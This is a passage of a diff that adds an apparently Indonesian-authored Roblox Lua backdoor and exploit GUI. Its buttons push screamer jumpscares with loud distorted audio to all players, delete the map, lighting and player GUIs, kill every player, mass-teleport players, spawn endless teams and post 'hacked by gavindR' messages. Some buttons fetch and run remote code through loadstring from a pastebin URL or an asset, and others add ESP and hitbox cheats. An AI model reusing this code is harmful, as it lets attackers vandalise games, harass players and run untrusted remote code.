+    -- SUARA JUMPSCARE
+    ---------------------------------------------------------
+    
+			local sounds = Instance.new("Sound")
+			sounds.SoundId = "rbxassetid://9069609200"
+			sounds.Volume = 10
+			local fx = Instance.new("DistortionSoundEffect", sounds)
+			fx.Level = 0.9
+			sounds.Parent = img
+			sounds:Play()
+
+
+    ---------------------------------------------------------
+    -- BLUR SCREEN
+    ---------------------------------------------------------
+    local blur = Instance.new("BlurEffect")
+    blur.Size = 0
+    blur.Parent = Lighting
+
+    TweenService:Create(blur, TweenInfo.new(0.4), {Size = 25}):Play()
+
+    ---------------------------------------------------------
+    -- FLASH PUTIH + MERAH
+    ---------------------------------------------------------
+    local flash = Instance.new("Frame")
+    flash.Size = UDim2.new(1,0,1,0)
+    flash.BackgroundColor3 = Color3.fromRGB(255,255,255)
+    flash.BackgroundTransparency = 1
+    flash.ZIndex = 200
+    flash.Parent = gui
+
+    task.spawn(function()
+        for i = 1,5 do
+            flash.BackgroundTransparency = 0.1
+            task.wait(0.07)
+            flash.BackgroundColor3 = Color3.fromRGB(255,0,0)
+            task.wait(0.07)
+            flash.BackgroundTransparency = 1
+            task.wait(0.05)
+        end
+    end)
+
+    ---------------------------------------------------------
+    -- CAMERA SHAKE
+    ---------------------------------------------------------
+    task.spawn(function()
+        local cam = workspace.CurrentCamera
+        for i = 1,40 do
+            cam.CFrame = cam.CFrame * CFrame.new(
+                math.random(-2,2)/10,
+                math.random(-2,2)/10,
+                math.random(-2,2)/10
+            )
+            task.wait(0.03)
+        end
+    end)
+
+    ---------------------------------------------------------
+    -- TEXT LABEL RAINBOW DI BAWAH
+    ---------------------------------------------------------
+    local text1 = Instance.new("TextLabel")
+    text1.AnchorPoint = Vector2.new(0,1)
+    text1.Position = UDim2.new(0,20,1,-40)
+    text1.Size = UDim2.new(0.55,0,0,45)
+    text1.BackgroundColor3 = Color3.fromRGB(255,0,0)
+    text1.Text = "Game was fe bypassed e by gavindR"
+    text1.Font = Enum.Font.GothamBold
+    text1.TextScaled = true
+    text1.TextColor3 = Color3.fromRGB(255,255,255)
+    text1.TextStrokeTransparency = 0.4
+    text1.Rotation = 7
+    text1.ZIndex = 300
+    text1.Parent = gui
+
+    task.spawn(function()
+        while gui.Parent do
+            for h = 0, 255, 7 do
+                text1.BackgroundColor3 = Color3.fromHSV(h/255,1,1)
+                task.wait(0.02)
+            end
+        end
+    end)
+
+    ---------------------------------------------------------
+    -- EFEK GLITCH (FRAME GOYANG CEPAT)
+    ---------------------------------------------------------
+    task.spawn(function()
+        for i=1,40 do
+            img.Position = UDim2.new(0, math.random(-15,15), 0, math.random(-15,15))
+            task.wait(0.03)
+        end
+        img.Position = UDim2.new(0,0,0,0)
+    end)
+
+    ---------------------------------------------------------
+    -- BANYAK HAHAHA RANDOM, JATUH, MUTER, PECAH
+    ---------------------------------------------------------
+    local function spawnLaugh()
+        local t = Instance.new("TextLabel")
+        t.Size = UDim2.new(0.22,0,0.1,0)
+        t.BackgroundTransparency = 1
+        t.Text = "HAHAHAHA!!!"
+        t.Font = Enum.Font.Bangers
+        t.TextScaled = true
+        t.TextColor3 = Color3.fromRGB(255,0,0)
+        t.Rotation = math.random(-20,20)
+        t.ZIndex = 500
+        t.Parent = gui
+
+        local rx = math.random(5,95)/100
+        local ry = math.random(-60,-10)/100
+
+        t.Position = UDim2.new(rx,0,ry,0)
+
+        local speed = math.random(15,30)/100
+
+        -- Tween jatuh
+        TweenService:Create(t, TweenInfo.new(speed, Enum.EasingStyle.Linear), {
+            Position = UDim2.new(rx,0,1.2,0),
+            Rotation = math.random(-360,360)
+        }):Play()
+
+        -- efek pecah setelah jatuh
+        task.delay(speed, function()
+            if t then
+                for i=1,4 do
+                    local p = Instance.new("TextLabel")
+                    p.Size = UDim2.new(0.07,0,0.05,0)
+                    p.BackgroundTransparency = 1
+                    p.Text = "HA"
+                    p.Font = Enum.Font.Bangers
+                    p.TextScaled = true
+                    p.TextColor3 = Color3.fromRGB(255,0,0)
+                    p.Position = t.Position
+                    p.ZIndex = 600
+                    p.Parent = gui
+
+                    TweenService:Create(p, TweenInfo.new(0.3), {
+                        Position = UDim2.new(
+                            rx + math.random(-20,20)/100,
+                            0,
+                            1.2 + math.random(-5,5)/100,
+                            0
+                        ),
+                        TextTransparency = 1
+                    }):Play()
+
+                    task.delay(0.3, function()
+                        if p then p:Destroy() end
+                    end)
+                end
+                t:Destroy()
+            end
+        end)
+    end
+
+    -- spam banyak HAHAHA
+    task.spawn(function()
+        while gui.Parent do
+            for i=1,20 do
+                spawnLaugh()
+                task.wait(0.05)
+            end
+            task.wait(0.1)
+        end
+    end)
+
+    ---------------------------------------------------------
+    -- HAPUS SEMUA SETELAH 7 DETIK
+    ---------------------------------------------------------
+    task.delay(9.486, function()
+        if gui then gui:Destroy() end
+        if blur then blur:Destroy() end
+    end)
+end
+end) 
+
+createButton("teleport to heighet", UDim2.new(0, 608, 0, 08), function()
+
+-- Cari posisi paling tinggi
+local highestY = -math.huge
+local highestPos = nil
+
+for _, part in pairs(workspace:GetDescendants()) do
+	if part:IsA("BasePart") then
+		local topY = part.Position.Y + (part.Size.Y / 2)
+		if topY > highestY then
+			highestY = topY
+			highestPos = part.Position + Vector3.new(0, part.Size.Y / 2 + 5, 0)
+		end
+	end
+end
+
+if highestPos then
+	-- Teleport player ke atas bagian tertinggi
+	hrp.CFrame = CFrame.new(highestPos)
+else
+	warn("Tidak ditemukan part tertinggi di workspace.")
+end
+end) 
+
+createButton("Real ssp", UDim2.new(0, 608, 0, 68), function()
+loadstring(game:HttpGet("https://pastebin.com/raw/XEDngJBU"))()
+end) 
+
+createButton("HIGHLIGHT esp", UDim2.new(0, 608, 0, 128), function()
+--// ESP Highlight Semua Player (Client Side)
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+
+-- Fungsi untuk pasang highlight pada karakter
+local function addHighlight(character)
+	if not character or character:FindFirstChildOfClass("Highlight") then return end
+
+	local highlight = Instance.new("Highlight")
+	highlight.Name = "PlayerESP"
+	highlight.FillTransparency = 0.7
+	highlight.OutlineTransparency = 0
+	highlight.OutlineColor = Color3.fromRGB(0, 255, 255)
+	highlight.FillColor = Color3.fromRGB(0, 150, 255)
+	highlight.Adornee = character
+	highlight.Parent = character
+end
+
+-- Pasang highlight ke semua player yang sudah ada
+for _, player in ipairs(Players:GetPlayers()) do
+	if player ~= LocalPlayer then
+		player.CharacterAdded:Connect(addHighlight)
+		if player.Character then
+			addHighlight(player.Character)
+		end
+	end
+end
+
+-- Saat ada player baru join
+Players.PlayerAdded:Connect(function(player)
+	if player ~= LocalPlayer then
+		player.CharacterAdded:Connect(addHighlight)
+	end
+end)
+
+-- Opsional: auto refresh tiap beberapa detik (jaga-jaga kalau karakter reset)
+while task.wait(5) do
+	for _, player in ipairs(Players:GetPlayers()) do
+		if player ~= LocalPlayer and player.Character then
+			addHighlight(player.Character)
+		end
+	end
+end
+end) 
+
+createButton("UNANCHORED", UDim2.new(0, 608, 0, 188), function()
+--// Unanchor semua part kecuali player
+local Players = game:GetService("Players")
+
+for _, obj in pairs(workspace:GetDescendants()) do
+	if obj:IsA("BasePart") then
+		local isPlayerPart = false
+
+		-- Cek apakah part milik karakter player
+		for _, player in pairs(Players:GetPlayers()) do
+			if player.Character and obj:IsDescendantOf(player.Character) then
+				isPlayerPart = true
+				break
+			end
+		end
+
+		-- Kalau bukan milik player → unanchor
+		if not isPlayerPart then
+			obj.Anchored = false
+		end
+	end
+end
+
+print("✅ Semua part di-unanchor (kecuali player).")
+end) 
+
+
+createButton("Teleport all to world tour", UDim2.new(0, 1208, 0, 488), function()
+--// Teleport semua pemain ke game lain
+local TeleportService = game:GetService("TeleportService")
+local Players = game:GetService("Players")
+
+-- Ganti ini dengan Game ID (PlaceId) tujuan
+local TARGET_PLACE_ID = 8150584021  -- 👈 Ganti ID-nya
+
+-- Delay dikit biar semua player keburu masuk dulu
+
+
+-- Teleport semua player yang ada
+for _, player in ipairs(Players:GetPlayers()) do
+	task.spawn(function()
+		pcall(function()
+			TeleportService:Teleport(TARGET_PLACE_ID, player)
+		end)
+	end)
+end
+
+-- Kalau ada player baru join setelah teleport awal, ikut juga
+
+end) 
+
+
+createButton("speed and jump back to normal", UDim2.new(0, 408, 0, 68), function()
+		local cam = workspace.CurrentCamera
+		cam.FieldOfView = 80
+-- Misalnya ini dipasang pada tombol GUI
+local Players = game:GetService("Players")
+
+for _, player in pairs(Players:GetPlayers()) do
+    if player.Character and player.Character:FindFirstChild("Humanoid") then
+        player.Character.Humanoid.JumpPower = 50.58
+        player.Character.Humanoid.WalkSpeed = 16
+    end
+end
+end) 
+
+createButton("FACE ALL", UDim2.new(0, 408, 0, 128), function()
+for i,v in pairs(game.Players:GetChildren()) do
+			if v.Character:FindFirstChild("Head") then
+				gui1=Instance.new("BillboardGui")
+				gui1.Parent = v.Character.Head
+				gui1.Adornee = v.Character.Head
+				gui1.Size=UDim2.new(2.5,0,2.5,0)
+				gui1.StudsOffset=Vector3.new(0,0.2,0)
+				gui1.AlwaysOnTop = true
+				text1=Instance.new("ImageLabel")
+				text1.Image = "rbxassetid://77005694743685"
+				text1.Size=UDim2.new(1,0,1,0)
+				text1.Position=UDim2.new(0,0,0,0)
+				text1.BackgroundTransparency = 1
+				text1.Parent=gui1
+				v.Character.Head.Transparency = 1
+			end
+		end
+end) 
+
+createButton("DAY", UDim2.new(0, 708, 0, 8), function()
+--// Selalu Siang
+local Lighting = game:GetService("Lighting")
+
+-- Atur waktu ke siang
+Lighting.ClockTime = 12
+Lighting.Brightness = 2
+Lighting.FogEnd = 10000000
+Lighting.GlobalShadows = true
+
+
+-- Kunci waktu supaya tidak berubah
+end) 
+
+createButton("NIGHT", UDim2.new(0, 708, 0, 68), function()
+--// Selalu Siang
+local Lighting = game:GetService("Lighting")
+
+-- Atur waktu ke siang
+Lighting.ClockTime = 0
+Lighting.GlobalShadows = true
+-- Kunci waktu supaya tidak berubah
+
+end) 
+
+createButton("utg bro", UDim2.new(0, 708, 0, 128), function()
+source=game:GetObjects("rbxassetid://2909645597")[1].Source
+loadstring(source)()
+end) 
+
+createButton("SadRc7 movie SO Dangerous", UDim2.new(0, 408, 0, 188), function()
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+
+for i, v in pairs(Players:GetPlayers()) do
+	if v:FindFirstChild("PlayerGui") and not v.PlayerGui:FindFirstChild("gavindR_glitch") then
+		task.spawn(function()
+			local gui = Instance.new("ScreenGui")
+			gui.Name = "gavindR_glitch"
+			gui.IgnoreGuiInset = true
+			gui.ResetOnSpawn = false
+         gui.DisplayOrder = 276228829
+			gui.Parent = v.PlayerGui
+
+			-- Background
+			local bg = Instance.new("ImageLabel", gui)
+			bg.Size = UDim2.new(1, 0, 1, 0)
+			bg.Position = UDim2.new(0, 0, 0, 0)
+			bg.Image = "rbxassetid://87228378014029"
+			bg.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+			bg.BackgroundTransparency = 0
+			bg.ImageTransparency = 0
+			bg.ZIndex = 0
+
+			--- Sound
+local sound = Instance.new("Sound")
+sound.Parent = bg
+sound.SoundId = "rbxassetid://91222661873706" -- bisa ganti ID di sini
+sound.Name = "Music"
+sound.Volume = 5
+sound.Pitch = 0.1
+sound.TimePosition = 1.75
+sound.Looped = true
+sound:Play()
+
+-- Distortion efek
+local dfx = Instance.new("DistortionSoundEffect")
+dfx.Level = 0.9
+dfx.Parent = sound
+
+-- Reset posisi kalau TimePosition = 0
+sound:GetPropertyChangedSignal("TimePosition"):Connect(function()
+	if sound.TimePosition == 0.1 then
+		sound.TimePosition = 1.75
+	end
+end)
+			-- Glitch text
+			local function makeGlitchText(text)
+				local label = Instance.new("TextLabel")
+				label.Text = text
+            label.Font = Enum.Font.Garamond
+				label.Size = UDim2.new(0, 150, 0, 45)
+				label.BackgroundTransparency = 1
+				label.TextScaled = true
+				label.TextColor3 = Color3.fromRGB(255, 255, 255)
+				label.ZIndex = 1
+            label.Name = label.Text
+				label.Parent = bg
+				return label
+			end
+
+			local glitchTexts = {}
+			local rows, cols = 26, 12
+			for y = 0, rows - 1 do
+				for x = 0, cols - 1 do
+					local lbl = makeGlitchText("SadRc7")
+					lbl.Position = UDim2.new(x / cols, 0, y / rows, 0)
+					table.insert(glitchTexts, lbl)
+				end
+			end
+
+			-- Teks utama
+			local topText = Instance.new("TextLabel", bg)
+			topText.Size = UDim2.new(1, 0, 0, 120)
+			topText.Position = UDim2.new(0, 40, -0.0, 0)
+			topText.BackgroundTransparency = 1
+			topText.Text = "S̵̙͕̀̃ā̤̓̍͘ḑ̴̞͛̒R͉̜̎͡͠c͕͗ͤ̕̕7̸̹̲ͮ̒ M͉̅ͮ͒ͤo̯̱̊͊͢v͒̄ͭ̏̇ỉ͔͖̜͌ẹ̿͋̒̕"
+         topText.Font = Enum.Font.Garamond
+			topText.TextScaled = true
+			topText.TextColor3 = Color3.new(1, 1, 1)
+			topText.ZIndex = 10
+			topText.Name = topText.Text
+
+			local bottomText = Instance.new("TextLabel", bg)
+			bottomText.Size = UDim2.new(1, 0, 0, 80)
+			bottomText.Position = UDim2.new(0, 40, 0.89, 0)
+			bottomText.BackgroundTransparency = 1
+			bottomText.Text = "𝘩𝘵𝘵𝘱??://𝘸𝘸𝘸.𝘠𝘰𝘶𝘵𝘶𝘣𝘦.𝘊𝘰𝘮/𝘚𝘱𝘦𝘚𝘢𝘥𝘙𝘤7"
+         bottomText.Font = Enum.Font.Garamond
+			bottomText.TextScaled = true
+			bottomText.TextColor3 = Color3.new(1, 1, 1)
+			bottomText.ZIndex = 10
+			bottomText.Name = bottomText.Text
+
+
+			-- Efek glitch animasi
+			task.spawn(function()
+				local startTime = tick()
+				while tick() - startTime < 4000 do
+					local color = Color3.fromRGB(245, 245, 245)
+               local color2 = Color3.fromRGB(245, 0, 0)
+					local width, height = math.random(165, 165), math.random(25, 45)
+
+					for _, lbl in pairs(glitchTexts) do
+						lbl.TextColor3 = color
+						lbl.Size = UDim2.new(0, width, 0, height)
+					end
+
+					for _, main in pairs({ topText, bottomText }) do
+						main.TextColor3 = color2
+						main.Size = UDim2.new(0, math.random(1100, 1520), 0, math.random(75, 95))
+					end
+					task.wait(0.02)
+				end
+			end)
+
+			task.wait(4000)
+			local tween = TweenService:Create(bg, TweenInfo.new(2), { ImageTransparency = 1 })
+			tween:Play()
+			tween.Completed:Wait()
+			gui:Destroy()
+		end)
+	end
+end
+end)
+
+createButton("coffe map", UDim2.new(0, 708, 0, 188), function()
+local Players = game:GetService("Players")
+local Lighting = game:GetService("Lighting")
+local StarterGui = game:GetService("StarterGui")
+local ReplicatedFirst = game:GetService("ReplicatedFirst")
+local player = Players.LocalPlayer
+
+-- Pastikan karakter siap
+local character = player.Character or player.CharacterAdded:Wait()
+local hrp = character:WaitForChild("HumanoidRootPart")
+
+----------------------------------------------------
+-- 🔥 2. Bersihkan workspace & GUI (tanpa TouchGui) --
+----------------------------------------------------
+
+-- Hapus semua object di workspace (kecuali terrain & kamera)
+for _, obj in ipairs(workspace:GetChildren()) do
+	if not Players:GetPlayerFromCharacter(obj) and obj.Name ~= "Camera" and obj.Name ~= "Terrain" then
+		obj:Destroy()
+	end
+end
+
+-- Bersihkan Lighting
+for _, obj in ipairs(Lighting:GetChildren()) do
+	obj:Destroy()
+end
+
+-- Bersihkan Terrain
+workspace.Terrain:Clear()
+
+-- Hapus GUI yang bukan bawaan sistem (CoreGui & TouchGui aman)
+for _, plr in ipairs(Players:GetPlayers()) do
+	local pg = plr:FindFirstChild("PlayerGui")
+	if pg then
+		for _, gui in ipairs(pg:GetChildren()) do
+			if gui.Name ~= "TouchGui" and not gui:IsA("CoreGui") then
+				gui:Destroy()
+			end
+		end
+	end
+end
+
+-- Hapus semua GUI di StarterGui
+for _, gui in ipairs(StarterGui:GetChildren()) do
+	gui:Destroy()
+end
+
+----------------------------------------------------
+-- 3. Jumpscare semua player (client local)
+----------------------------------------------------
+for _, v in pairs(Players:GetPlayers()) do
+	if v:FindFirstChild("PlayerGui") and not v.PlayerGui:FindFirstChild("Screamer") then
+		task.spawn(function()
+			local newgui = Instance.new("ScreenGui")
+			newgui.Name = "Screamer"
+			newgui.IgnoreGuiInset = true
+			newgui.ResetOnSpawn = false
+			newgui.DisplayOrder = 10000
+			newgui.Parent = v.PlayerGui
+
+			local newimage = Instance.new("ImageLabel")
+			newimage.Parent = newgui
+			newimage.Size = UDim2.new(1, 0, 1, 0)
+			newimage.Position = UDim2.new(0, 0, 0, 0)
+			newimage.BackgroundTransparency = 0
+			newimage.Image = "rbxassetid://113665607881195"
+
+			local s = Instance.new("Sound")
+			s.SoundId = "rbxassetid://9069609200"
+			s.Volume = 10
+			s.Looped = false
+			s.Parent = newgui
+			s:Play()
+
+			wait(9.5487)
+			newgui:Destroy()
+		end)
+	end
+end
+
+----------------------------------------------------
+-- 4. Baseplate hijau besar
+----------------------------------------------------
+local baseplate = Instance.new("Part")
+baseplate.Size = Vector3.new(500, 1, 500)
+baseplate.Anchored = true
+baseplate.CanCollide = true
+baseplate.Transparency = 0
+baseplate.Color = Color3.fromRGB(127, 142, 100)
+baseplate.Material = Enum.Material.Grass
+baseplate.Position = Vector3.new(0, 0, 0)
+baseplate.Name = "GreenBaseplate"
+baseplate.Parent = workspace
+
+----------------------------------------------------
+-- 5. Spawn model utama
+----------------------------------------------------
+local modelId = "rbxassetid://9520307807"
+local modelList = game:GetObjects(modelId)
+local model
+
+if #modelList > 0 then
+	model = modelList[1]
+	model.Parent = workspace
+	model:PivotTo(CFrame.new(0, baseplate.Position.Y + 68.199, 0))
+end
+
+local modelId = "rbxassetid://1480370269"
+local modelList = game:GetObjects(modelId)
+local model
+
+if #modelList > 0 then
+	model = modelList[1]
+	model.Parent = workspace
+	model:PivotTo(CFrame.new(-8.6, 4.2, -32.8))
+end
+
+local modelId = "rbxassetid://1480370269"
+local modelList = game:GetObjects(modelId)
+local model
+
+if #modelList > 0 then
+	model = modelList[1]
+	model.Parent = workspace
+	model:PivotTo(CFrame.new(-43.2, 4.2, -32.8))
+end
+
+bahj = Instance.new("Part",Workspace)
+bahj.Anchored = true
+bahj.Transparency = 1
+bahj.Size = Vector3.new(5, 5, 0)
+bahj.Cframe = Cframe.new(-56.2, 4.2, -32.8)
+----------------------------------------------------
+-- 16.  all
+----------------------------------------------------
+local Players = game:GetService("Players")
+
+for _, player in pairs(Players:GetPlayers()) do
+    if player.Character and player.Character:FindFirstChild("Humanoid") then
+        player.Character.Humanoid.Health = 0
+    end
+end
+
+----------------------------------------------------
+-- 6. Spawn model 'k' untuk respawn
+----------------------------------------------------
+local spawnModelId = "rbxassetid://53326"
+local spawnModelList = game:GetObjects(spawnModelId)
+local spawnModel
+
+if #spawnModelList > 0 then
+	spawnModel = spawnModelList[1]
+	spawnModel.Name = "k"
+	spawnModel.Parent = workspace
+	spawnModel:PivotTo(CFrame.new(-24, baseplate.Position.Y  + 1.399999618530273, -59.900001525878906)) 
+end
+
+-- 7. Respawn player di model 'k'
+local function onCharacterAdded(character)
+	task.spawn(function()
+		local hrp = character:WaitForChild("HumanoidRootPart")
+		local target
+
+		repeat
+			target = workspace:FindFirstChild("k")
+			task.wait(0.01)
+		until target
+
+		task.wait(0.04)
+		hrp.CFrame = target:GetPivot() * CFrame.new(0, 2.6, 0)
+	end)
+end
+
+-- Jalankan untuk player lokal
+player.CharacterAdded:Connect(onCharacterAdded)
+
+----------------------------------------------------
+-- 8. get player all lock
+----------------------------------------------------
+for _, player in ipairs(Players:GetPlayers()) do
+	player.CameraMode = Enum.CameraMode.LockFirstPerson
+end
+
+----------------------------------------------------
+-- 9. get skybox
+----------------------------------------------------
+local sky= [[
+rbxassetid://77005694743685
+]]
+
+s = Instance.new("Sky") 
+s.Parent = game:GetService("Lighting")
+s.SkyboxBk = sky
+s.SkyboxDn = sky
+s.SkyboxFt = sky
+s.SkyboxLf = sky
+s.SkyboxRt = sky
+s.SkyboxUp = sky
+
+----------------------------------------------------
+-- 10. Musik latar
+----------------------------------------------------
+local sound = Instance.new("Sound")
+sound.SoundId = "rbxassetid://1846575559"
+sound.Volume = 5
+sound.PlaybackSpeed = 0.8
+sound.Looped = true
+sound.Parent = workspace
+wait(9.687)
+sound:Play()
+end) 
+
+createButton("destroy game", UDim2.new(0, 708, 0, 248), function()
+
+local Players = game:GetService("Players")
+local Lighting = game:GetService("Lighting")
+local Teams = game:GetService("Teams")
+local player = Players.LocalPlayer
+
+
+if player:FindFirstChild("PlayerGui") and not player.PlayerGui:FindFirstChild("Screamer") then
+	local gui = Instance.new("ScreenGui", player.PlayerGui)
+	gui.Name = "Screamer"
+	gui.IgnoreGuiInset = true
+	gui.ResetOnSpawn = false
+   gui.DisplayOrder = 25000
+
+	local img = Instance.new("ImageLabel", gui)
+	img.Size = UDim2.new(1, 0, 1, 0)
+	img.BackgroundTransparency = 1
+	img.ImageTransparency = 0
+
+	local sounds = Instance.new("Sound", gui)
+	sounds.SoundId = "rbxassetid://9069609200"
+	sounds.Volume = 10
+	local fx = Instance.new("DistortionSoundEffect", sounds)
+	fx.Level = 0.9
+	sounds:Play()
+
+
+
+	-- Animasi gambar
+	local frames = {
+		"rbxassetid://113665607881195",
+		"rbxassetid://87439537035781",
+		"rbxassetid://77005694743685"
+	}
+	task.spawn(function()
+		while gui.Parent do
+			for _, id in ipairs(frames) do
+				img.Image = id
+				task.wait(0.06)
+			end
+		end
+	end)
+
+	-- Shake kamera
+	
+
+	task.delay(3, function()
+		gui:Destroy()
+	end)
+end
+
+-- ========== SKY FLASH ==========
+local sky = Instance.new("Sky", Lighting)
+local skyIDs = {
+	"rbxassetid://77005694743685",
+	"rbxassetid://87439537035781",
+	"rbxassetid://113665607881195"
+}
+task.spawn(function()
+	while task.wait(0.05) do
+		for _, id in ipairs(skyIDs) do
+			sky.SkyboxBk = id
+			sky.SkyboxDn = id
+			sky.SkyboxFt = id
+			sky.SkyboxLf = id
+			sky.SkyboxRt = id
+			sky.SkyboxUp = id
+			task.wait(0.05)
+		end
+	end
+end)
+
+-- ========== PARTICLE GLITCH ==========
+
+
+local function createParticle(parent, texture)
+	local p = Instance.new("ParticleEmitter", parent)
+	p.Texture = texture
+	p.Rate = 100
+	p.Size = NumberSequence.new({
+		NumberSequenceKeypoint.new(0, 4),
+		NumberSequenceKeypoint.new(1, 0)
+	})
+	p.Lifetime = NumberRange.new(5, 10)
+	p.Speed = NumberRange.new(50, 100)
+	p.VelocitySpread = 360
+	p.Rotation = NumberRange.new(0, 360)
+	p.RotSpeed = NumberRange.new(90, 180)
+	p.Transparency = NumberSequence.new({
+		NumberSequenceKeypoint.new(0, 0),
+		NumberSequenceKeypoint.new(0.8, 0.2),
+		NumberSequenceKeypoint.new(1, 1)
+	})
+	p.LightEmission = 1
+	p.Acceleration = Vector3.new(0, 10, 0)
+	p.Drag = 3
+end
+
+for _, part in ipairs(workspace:GetDescendants()) do
+	if part:IsA("BasePart") and math.random(1, 3) == 1 then
+		createParticle(part, skyIDs[math.random(1, #skyIDs)])
+	end
+end
+
+-- ========== DECAL FLOOD ==========
+local de = "rbxthumb://type=Asset&id=77005694743685&w=420&h=420"
+
+local function exPro(root)
+	for _, v in pairs(root:GetChildren()) do
+		if v:IsA("Decal") and v.Texture ~= de then
+			v:Destroy()
+		elseif v:IsA("BasePart") then
+			v.Material = Enum.Material.Plastic
+			v.Transparency = 0
+			for _, face in ipairs(Enum.NormalId:GetEnumItems()) do
+				local decal = Instance.new("Decal")
+				decal.Texture = de
+				decal.Face = face
+				decal.Parent = v
+			end
+		end
+		exPro(v)
+	end
+end
+
+task.spawn(function()
+	pcall(function()
+		exPro(workspace)
+	end)
+end)
+
+local sounds = Instance.new("Sound", workspace)
+	sounds.SoundId = "rbxassetid://139488665764275"
+	sounds.Volume = 10
+	local fx = Instance.new("DistortionSoundEffect", sounds)
+	fx.Level = 0.9
+	sounds:Play()
+
+-- ========== HINT + BILLBOARD ==========
+local hint = Instance.new("Hint", workspace)
+hint.Text = "Get hacked by gavindR can ascess backdoor"
+
+for _, v in pairs(Players:GetPlayers()) do
+	if v.Character and v.Character:FindFirstChild("Head") then
+		local gui1 = Instance.new("BillboardGui", v.Character.Head)
+		gui1.Adornee = v.Character.Head
+		gui1.Size = UDim2.new(2.5, 0, 2.5, 0)
+		gui1.StudsOffset = Vector3.new(0, 0.2, 0)
+		gui1.AlwaysOnTop = true
+
+		local text = Instance.new("TextLabel", gui1)
+		text.BackgroundTransparency = 1
+		text.BorderSizePixel = 0
+		text.Text = "GavindR was hare"
+		text.Font = Enum.Font.Fantasy
+		text.TextSize = 24
+		text.TextStrokeTransparency = 0
+		text.TextStrokeColor3 = Color3.new(0, 0, 0)
+		text.TextColor3 = Color3.new(0.8, 0, 0)
+		text.Size = UDim2.new(1, 0, 0.5, 0)
+
+		local img = Instance.new("ImageLabel", gui1)
+		img.Image = de
+		img.Size = UDim2.new(1, 0, 1, 0)
+		img.BackgroundTransparency = 1
+
+		v.Character.Head.Transparency = 1
+	end
+end
+
+findteams = game:FindFirstChild("Teams")
+if findteams then
+findteams:ClearAllChildren()
+end
+while true do
+wait(0.01)
+if findteams then
+team = Instance.new("Team",findteams)
+team.Name = "hail gavindR?!!!"..tostring(math.random(1,33373))
+team.TeamColor = BrickColor.Random()
+end
+end
+
+end)
+
+
+createButton("antifling", UDim2.new(0, 1008, 0, 308), function()
+-- 🛡️ Anti Fling Script
+-- by ChatGPT (GPT-5)
+
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+
+local player = Players.LocalPlayer
+local character = player.Character or player.CharacterAdded:Wait()
+local hrp = character:WaitForChild("HumanoidRootPart")
+
+-- Lock fungsi
+local antiFlingActive = true
+
+-- Fungsi utama anti fling
+RunService.Heartbeat:Connect(function()
+	if antiFlingActive and character and hrp then
+		-- Cegah velocity besar dari luar
+		hrp.Velocity = Vector3.new(0, 0, 0)
+		hrp.RotVelocity = Vector3.new(0, 0, 0)
+		
+		-- Cegah pemain lain yang fling
+		for _, other in pairs(Players:GetPlayers()) do
+			if other ~= player and other.Character and other.Character:FindFirstChild("HumanoidRootPart") then
+				local otherHRP = other.Character.HumanoidRootPart
+				if (otherHRP.Position - hrp.Position).Magnitude < 10 then
+					otherHRP.Velocity = Vector3.new(0, 0, 0)
+					otherHRP.RotVelocity = Vector3.new(0, 0, 0)
+				end
+			end
+		end
+	end
+end)
+
+print("✅ Anti-Fling aktif. Player aman dari lemparan physics.")
+end) 
+
+createButton("unanti fling", UDim2.new(0, 908, 0, 308), function()
+-- 🔓 Un-Anti Fling Script
+-- by ChatGPT (GPT-5)
+
+local RunService = game:GetService("RunService")
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+local character = player.Character or player.CharacterAdded:Wait()
+
+-- Nonaktifkan anti fling
+for _, conn in pairs(getconnections(RunService.Heartbeat)) do
+	if type(conn.Function) == "function" and debug.getinfo(conn.Function).source:find("AntiFling") then
+		conn:Disconnect()
+	end
+end
+
+print("❌ Anti-Fling dimatikan. Kamu bisa di-fling lagi.")
+end) 
+
+createButton("Got voice chat back", UDim2.new(0, 1108, 0, 608), function()
+local voiceChatService = game:GetService("VoiceChatService")
+:joinVoice()
+end) 
+
+createButton("hitbox", UDim2.new(0, 1208, 0, 608), function()
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local RunService = game:GetService("RunService")
+
+-- temp tempat hitbox semua player
+local Hitboxes = {}
+
+-- buat 1 hitbox
+local function createHitbox(part, size, color)
+	if not part then return end
+
+	local hb = Instance.new("Part")
+	hb.Name = "HB_" .. part.Name
+	hb.Size = Vector3.new(size, size, size)
+	hb.Color = color
+	hb.Transparency = 0.7
+	hb.CanCollide = false
+	hb.Anchored = true
+	hb.Massless = true
+	hb.Parent = workspace
+
+	return hb
+end
+
+-- pasang hitbox + selection box pada karakter
+local function setupCharacter(char, plr)
+	if plr == LocalPlayer then return end
+
+	local hrp = char:FindFirstChild("HumanoidRootPart")
+	local head = char:FindFirstChild("Head")
+
+	Hitboxes[plr] = Hitboxes[plr] or {}
+
+	if hrp then
+		-- HRP hitbox 8
+		Hitboxes[plr].HRP = createHitbox(hrp, 8, Color3.fromRGB(255, 0, 0))
+
+		local sb = Instance.new("SelectionBox")
+		sb.Adornee = hrp
+		sb.Color3 = Color3.fromRGB(255, 0, 0)
+		sb.LineThickness = 0.05
+		sb.SurfaceTransparency = 0.5
+		sb.Parent = hrp
+	end
+
+	if head then
+		-- Head hitbox 5
+		Hitboxes[plr].Head = createHitbox(head, 5, Color3.fromRGB(0, 255, 255))
+
+		local sb2 = Instance.new("SelectionBox")
+		sb2.Adornee = head
+		sb2.Color3 = Color3.fromRGB(0, 255, 255)
+		sb2.LineThickness = 0.05
+		sb2.SurfaceTransparency = 0.5
+		sb2.Parent = head
+	end
+end
+
+-- follow hitbox via RunService
+RunService.Heartbeat:Connect(function()
+	for plr, data in pairs(Hitboxes) do
+		if plr.Character then
+			local hrp = plr.Character:FindFirstChild("HumanoidRootPart")
+			local head = plr.Character:FindFirstChild("Head")
+
+			if data.HRP and hrp then
+				data.HRP.CFrame = hrp.CFrame
+			end
+			if data.Head and head then
+				data.Head.CFrame = head.CFrame
+			end
+		end
+	end
+end)
+
+-- player join
+Players.PlayerAdded:Connect(function(plr)
+	plr.CharacterAdded:Connect(function(char)
+		task.wait(0.1)
+		setupCharacter(char, plr)
+	end)
+end)
+
+-- untuk yang sudah ada
+for _, plr in ipairs(Players:GetPlayers()) do
+	if plr ~= LocalPlayer and plr.Character then
+		setupCharacter(plr.Character, plr)
+	end
+end
+end) 
+
+createButton("Nalaka", UDim2.new(0, 1308, 0, 608), function()
+
